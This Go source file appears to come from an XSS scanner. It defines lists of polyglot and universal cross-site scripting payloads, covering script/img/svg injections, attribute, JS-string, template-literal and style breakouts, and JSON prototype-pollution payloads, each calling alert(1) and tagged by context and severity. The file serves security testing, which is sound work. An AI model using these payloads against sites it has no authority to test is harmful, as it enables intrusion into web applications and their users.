package payload

import (
	"github.com/xsscan/xsscan/pkg/context"
	"github.com/xsscan/xsscan/pkg/model"
)

// polyglotPayloads is the pre-built polyglot list, constructed once at
// package init to avoid per-injection-point slice allocation.
// READ-ONLY contract: callers must not mutate the returned slice.
var polyglotPayloads = []PayloadTemplate{
	// Classic polyglot: works in HTML body, attribute, JS string
	{
		Value:    `javascript:/*--></title></textarea></style></script></xmp><svg/onload=alert(1)>`,
		Context:  context.ContextHTMLBody,
		Severity: model.Critical,
		Desc:     "Polyglot: html/attr/js breakout via comment close + svg onload",
	},
	// JS-first polyglot: works in JS string, JS block, template literal
	{
		Value:    `'-alert(1)-'`,
		Context:  context.ContextJSString,
		Severity: model.High,
		Desc:     "Polyglot: JS string breakout via single quotes",
	},
	{
		Value:    `"-alert(1)-"`,
		Context:  context.ContextJSString,
		Severity: model.High,
		Desc:     "Polyglot: JS string breakout via double quotes",
	},
	// Template literal + attribute breakout polyglot
	{
		Value:    `${alert(1)}`,
		Context:  context.ContextJSTemplateLiteral,
		Severity: model.High,
		Desc:     "Polyglot: template literal expression injection",
	},
	// Multi-context breakout: closes script tag, injects new one
	{
		Value:    `</script><img src=x onerror=alert(1)>`,
		Context:  context.ContextJSBlock,
		Severity: model.Critical,
		Desc:     "Polyglot: script tag close + img injection",
	},
	// CSS + HTML polyglot
	{
		Value:    `</style><svg onload=alert(1)>`,
		Context:  context.ContextCSSBlock,
		Severity: model.High,
		Desc:     "Polyglot: style close + svg injection",
	},
	// Event handler in attribute context (works even without full tag injection)
	{
		Value:    `" onfocus="alert(1)" autofocus="`,
		Context:  context.ContextHTMLAttrValue,
		Severity: model.High,
		Desc:     "Polyglot: attribute breakout + event handler + autofocus",
	},
	{
		Value:    `' onmouseover='alert(1)'`,
		Context:  context.ContextHTMLAttrValue,
		Severity: model.Medium,
		Desc:     "Polyglot: single-quote attr breakout + mouseover",
	},
	// Prototype pollution payloads — work when JSON input is merged into objects
	{
		Value:    `{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}`,
		Context:  context.ContextJSONValue,
		Severity: model.High,
		Desc:     "Prototype pollution: __proto__ innerHTML injection",
	},
	{
		Value:    `{"constructor":{"prototype":{"innerHTML":"<img src=x onerror=alert(1)>"}}}`,
		Context:  context.ContextJSONValue,
		Severity: model.High,
		Desc:     "Prototype pollution: constructor chain",
	},
}

// PolyglotPayloads returns payloads that work in multiple contexts simultaneously.
// A polyglot payload is designed to be valid in HTML body, HTML attribute value,
// JavaScript string, and other contexts at once — maximizing the chance of execution
// regardless of the exact reflection context. Returns the cached list (read-only).
func PolyglotPayloads() []PayloadTemplate {
	return polyglotPayloads
}

// ContextAgnosticPayloads returns payloads that should be tested in ALL detected contexts.
// These are the "universal" payloads — simple enough to potentially execute anywhere.
func ContextAgnosticPayloads() []PayloadTemplate {
	return []PayloadTemplate{
		{
			Value:    `<script>alert(1)</script>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "Universal: basic script tag",
		},
		{
			Value:    `<img src=x onerror=alert(1)>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "Universal: img onerror",
		},
		{
			Value:    `<svg onload=alert(1)>`,
			Context:  context.ContextHTMLBody,
			Severity: model.High,
			Desc:     "Universal: svg onload",
		},
		{
			Value:    `alert(1)`,
			Context:  context.ContextJSBlock,
			Severity: model.Medium,
			Desc:     "Universal: bare alert call (JS block context)",
		},
	}
}
